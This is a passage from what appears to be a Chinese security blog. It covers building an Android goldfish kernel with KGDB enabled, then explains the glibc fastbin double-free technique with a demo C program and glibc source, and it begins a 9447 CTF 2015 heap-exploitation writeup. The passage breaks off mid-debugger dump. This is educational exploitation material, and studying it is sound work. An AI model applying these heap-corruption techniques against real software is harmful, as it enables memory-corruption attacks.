class="line">sakura@ubuntu:~/goldfish$ git branch -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/android-3.10</span><br><span class="line">  remotes/origin/android-3.18</span><br><span class="line">  remotes/origin/android-3.4</span><br><span class="line">  remotes/origin/android-goldfish-2.6.29</span><br><span class="line">  remotes/origin/android-goldfish-3.10</span><br><span class="line">  remotes/origin/android-goldfish-3.10-k-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.10-l-mr1-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.10-m-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.10-n-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.18</span><br><span class="line">  remotes/origin/android-goldfish-3.18-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.4</span><br><span class="line">  remotes/origin/android-goldfish-3.4-l-mr1-dev</span><br><span class="line">  remotes/origin/android-goldfish-4.4-dev</span><br><span class="line">  remotes/origin/heads/for/android-goldfish-3.18-dev</span><br><span class="line">  remotes/origin/linux-goldfish-3.0-wip</span><br><span class="line">  remotes/origin/master</span><br><span class="line">sakura@ubuntu:~/goldfish$</span><br></pre></td></tr></table></figure><p>我们选择3.4版本</p><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ git checkout remotes/origin/android-goldfish-3.4 -b goldfish3.4</span><br><span class="line">Checking out files: 100% (38854/38854), done.</span><br><span class="line">Branch goldfish3.4 set up to track remote branch android-3.4 from origin.</span><br><span class="line">Switched to a new branch &apos;goldfish3.4&apos;</span><br></pre></td></tr></table></figure><h2 id="配置交叉编译链"><a href="#配置交叉编译链" class="headerlink" title="配置交叉编译链"></a>配置交叉编译链</h2><p>首先，要翻墙,mac及其虚拟机可以参考<a href="http://eternalsakura13.com/2018/02/02/proxy/">我的博客</a><br>然后获取交叉编译链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6</span><br></pre></td></tr></table></figure></p><p>设置环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ sudo vim /etc/profile</span><br></pre></td></tr></table></figure></p><p>在打开的文件最末添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/sakura/arm-eabi-4.6/bin:$PATH</span><br></pre></td></tr></table></figure></p><p>然后使配置生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ source /etc/profile</span><br></pre></td></tr></table></figure></p><p>确认一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ echo $PATH</span><br><span class="line">/home/sakura/arm-eabi-4.6/bin:/home/sakura/Android/Sdk/platform-tools:/usr/local/java/jdk1.6.0_45/bin:/usr/local/java/jdk1.6.0_45/jre/bin:/usr/local/java/jdk1.6.0_45:/home/sakura/Android/Sdk/platform-tools:/usr/local/java/jdk1.6.0_45/bin:/usr/local/java/jdk1.6.0_45/jre/bin:/usr/local/java/jdk1.6.0_45:/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span><br></pre></td></tr></table></figure></p><h2 id="配置编译选项，进行编译"><a href="#配置编译选项，进行编译" class="headerlink" title="配置编译选项，进行编译"></a>配置编译选项，进行编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ export ARCH=arm</span><br><span class="line">sakura@ubuntu:~/goldfish$ export CROSS_COMPILE=arm-eabi-</span><br><span class="line">sakura@ubuntu:~/goldfish$ export SUBARCH=arm</span><br><span class="line">sakura@ubuntu:~/goldfish$ make goldfish_armv7_defconfig</span><br><span class="line">  HOSTCC  scripts/basic/fixdep</span><br><span class="line">  HOSTCC  scripts/kconfig/conf.o</span><br><span class="line">  SHIPPED scripts/kconfig/zconf.tab.c</span><br><span class="line">  SHIPPED scripts/kconfig/zconf.lex.c</span><br><span class="line">  SHIPPED scripts/kconfig/zconf.hash.c</span><br><span class="line">  HOSTCC  scripts/kconfig/zconf.tab.o</span><br><span class="line">  HOSTLD  scripts/kconfig/conf</span><br><span class="line">#</span><br><span class="line"># configuration written to .config</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>增加内核编译选项,修改goldfish/.config配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ vim /home/sakura/goldfish/.config</span><br></pre></td></tr></table></figure></p><p>添加以下两行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_DEBUG_INFO=y #显示vmlinux符号</span><br><span class="line">CONFIG_KGDB=y #开启kgdb</span><br></pre></td></tr></table></figure></p><p>执行 make 命令进行编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ make</span><br></pre></td></tr></table></figure></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>编译成功后会显示<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-03-165239.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">OBJCOPY arch/arm/boot/Image</span><br><span class="line">Kernel: arch/arm/boot/Image is ready</span><br><span class="line">AS      arch/arm/boot/compressed/head.o</span><br><span class="line">GZIP    arch/arm/boot/compressed/piggy.gzip</span><br><span class="line">AS      arch/arm/boot/compressed/piggy.gzip.o</span><br><span class="line">CC      arch/arm/boot/compressed/misc.o</span><br><span class="line">CC      arch/arm/boot/compressed/decompress.o</span><br><span class="line">CC      arch/arm/boot/compressed/string.o</span><br><span class="line">SHIPPED arch/arm/boot/compressed/lib1funcs.S</span><br><span class="line">AS      arch/arm/boot/compressed/lib1funcs.o</span><br><span class="line">SHIPPED arch/arm/boot/compressed/ashldi3.S</span><br><span class="line">AS      arch/arm/boot/compressed/ashldi3.o</span><br><span class="line">LD      arch/arm/boot/compressed/vmlinux</span><br><span class="line">OBJCOPY arch/arm/boot/zImage</span><br><span class="line">Kernel: arch/arm/boot/zImage is ready</span><br></pre></td></tr></table></figure></p><p>以指定的内核启动模拟器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -verbose -show-kernel -kernel ~/goldfish/arch/arm/boot/zImage</span><br></pre></td></tr></table></figure></p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>输入emulator的时候报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">No command &apos;emulator&apos; found, did you mean:</span><br><span class="line"> Command &apos;qemulator&apos; from package &apos;qemulator&apos; (universe)</span><br><span class="line">emulator: command not found</span><br></pre></td></tr></table></figure></p><p>我至今不知道为什么经常emulator就没了。。但是只要输入lunch,然后再make一下，几分钟就好了……</p>]]></content>
      
      <categories>
          
          <category> Android漏洞分析基础 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Fastbin Double Free</title>
      <link href="/2018/03/02/fastbin/"/>
      <url>/2018/03/02/fastbin/</url>
      <content type="html"><![CDATA[<h1 id="Fastbin-Double-Free原理"><a href="#Fastbin-Double-Free原理" class="headerlink" title="Fastbin Double Free原理"></a>Fastbin Double Free原理</h1><h2 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h2><p>fastbins 划分为10个，其中每一个bins都是一个单向链表，并在链表首部进行插入和删除操作(先进后出)。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-120518.jpg" alt=""><br>对于SIZE_SZ为4B的平台，小于64B的chunk分配请求，对于SIZE_SZ为8B的平台，小于128B的chunk分配请求。首先会查找fast bins中是否有所需大小的chunk存在(精确匹配)，如果存在，就直接返回。</p><p>默认情况下，fast bins 只 cache 了 small bins 的前 7 个大小的空闲 chunk，也就是说:</p><ul><li>对于SIZE_SZ为4B的平台，fast bins有7个chunk空闲链表(bin)，每个 bin的chunk大小依次为16B，24B，32B，40B，48B，56B，64B;<strong>但是其可以支持的chunk的数据空间最大为80字节。</strong></li><li>对于SIZE_SZ为8B的平台，fast bins有7个chunk空闲链表(bin)，每个bin的chunk大小依次为32B，48B，64B，80B，96B，112B，128B;<strong>但是其可以支持的chunk的数据空间最大为160字节。</strong><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</li></ul><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>ubuntu14.04 x86_64<br>pwndbg:<a href="https://github.com/pwndbg/pwndbg#readme" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg#readme</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-021235.jpg" alt=""></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放资源超过两次可能导致内存泄漏（memory leaks）<br>以上代码是在fastbins进行的double-free攻击</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.先malloc()三次，产生三个chunk（堆块）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-023120.png" alt=""><br><strong>note:为什么malloc(8)，实际上分配32个字节？</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE \</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req) \</span></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \ </span><br><span class="line">MINSIZE : \ </span><br><span class="line">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></p><p>32位上SIZE_SZ为4字节，64位上为8字节。<br>MALLOC_ALIGN_MASK等于2 <em> SIZE_SZ。<br>MIN_CHUNK_SIZE 定义了最小的 chunk 的大小，32 位平台上为 16 字节，64 位平台为 24 字节或是 32 字节。MINSIZE 定义了最小的分配的内存大小，是对 MIN_CHUNK_SIZE 进行了 2 </em> SIZE_SZ 对齐，地址对齐后与 MIN_CHUNK_SIZE 的大小仍然是一样的。<br>2.打印出返回给用户的堆指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-023940.jpg" alt=""><br><strong>note:为什么返回给用户的指针比chunk的首地址大0x10个字节？</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-024129.png" alt=""><br>因为返回的是mem，而不是chunk<br>3.free掉第一块内存<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-024208.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br></pre></td></tr></table></figure></p><p>如果我们再free(a)的话,程序就会崩溃.因为这块内存刚好在对应free-list（fastbins）的首部,再次free这块内存的时候就会被检查到.</p><p><strong>note:我们触发了什么检查？</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-024322.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (*fb == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (*fb != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;fd = *fb;</span><br><span class="line">    *fb = p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>4.所以我们释放另一块chunk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure></p><p>fastbin是在链表的首部进行插入删除，所以现在的首部是chunk2(b)了<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-025117.jpg" alt=""><br>5.再次释放a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br></pre></td></tr></table></figure></p><p>现在，a已经不在首部了，所以当我们再次free(a)就不会触发检查了！！！<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-02-025219.jpg" alt=""><br>6.double free<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure></p><p>现在有两个指针指向同一块内存，任何一个改变就会影响另一个。</p><h1 id="9447-CTF-2015-writeup"><a href="#9447-CTF-2015-writeup" class="headerlink" title="9447 CTF 2015 writeup"></a>9447 CTF 2015 writeup</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine</a></p><h3 id="系统和工具"><a href="#系统和工具" class="headerlink" title="系统和工具"></a>系统和工具</h3><p>ubuntu14.04,pwndbg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 14.04.5 LTS</span><br><span class="line">Release:14.04</span><br><span class="line">Codename:trusty</span><br></pre></td></tr></table></figure></p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec search </span><br><span class="line">[*] '/home/sakura/search'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x0000000000400D7E</span><br><span class="line">输入AAA SSSS,BBB SSSS,CCC SSSS</span><br><span class="line">pwndbg&gt; x /60gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021</span><br><span class="line">0x603010:0x53535353204141410x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000031</span><br><span class="line">0x603030:0x00000000006030100x0000000000000003</span><br><span class="line">0x603040:0x00000000006030100x0000000000000008</span><br><span class="line">0x603050:0x00000000000000000x0000000000000031</span><br><span class="line">0x603060:0x00000000006030140x0000000000000004</span><br><span class="line">0x603070:0x00000000006030100x0000000000000008</span><br><span class="line">0x603080:0x00000000006030300x0000000000000021</span><br><span class="line">0x603090:0x53535353204242420x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000031</span><br><span class="line">0x6030b0:0x00000000006030900x0000000000000003</span><br><span class="line">0x6030c0:0x00000000006030900x0000000000000008</span><br><span class="line">0x6030d0:0x00000000006030600x0000000000000031</span><br><span class="line">0x6030e0:0x00000000006030940x0000000000000004</span><br><span class="line">0x6030f0:0x00000000006030900x0000000000000008</span><br><span class="line">0x603100:0x00000000006030b00x0000000000000021</span><br><span class="line">0x603110:0x53535353204343430x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000000031</span><br><span class="line">0x603130:0x00000000006031100x0000000000000003</span><br><span class="line">0x603140:0x00000000006031100x0000000000000008</span><br><span class="line">0x603150:0x00000000006030e00x0000000000000031</span><br><span class="line">0x603160:0x00000000006031140x0000000000000004</span><br><span class="line">0x603170:0x00000000006031100x0000000000000008</span><br><span class="line">0x603180:0x00000000006031300x0000000000020e81</span><br><span class="line">0x603190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6031d0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /x 0x00000000006020B8</span><br><span class="line">0x6020b8:0x0000000000603160</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Enter the word size:</span><br><span class="line">4</span><br><span class="line">Enter the word:</span><br><span class="line">SSSS</span><br><span class="line">Found 8: CCC SSSS</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br><span class="line">Found 8: BBB SSSS</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br><span class="line">Found 8: AAA SSSS</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /60gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021</span><br><span class="line">0x603010:0x00000000006030800x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000031</span><br><span class="line">0x603030:0x00000000006030100x0000000000000003</span><br><span class="line">0x603040:0x00000000006030100x0000000000000008</span><br><span class="line">0x603050:0x00000000000000000x0000000000000031</span><br><span class="line">0x603060:0x00000000006030140x0000000000000004</span><br><span class="line">0x603070:0x00000000006030100x0000000000000008</span><br><span class="line">0x603080:0x00000000006030300x0000000000000021</span><br><span class="line">0x603090:0x00000000006031000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000031</span><br><span class="line">0x6030b0:0x00000000006030900x0000000000000003</span><br><span class="line">0x6030c0:0x00000000006030900x0000000000000008</span><br><span 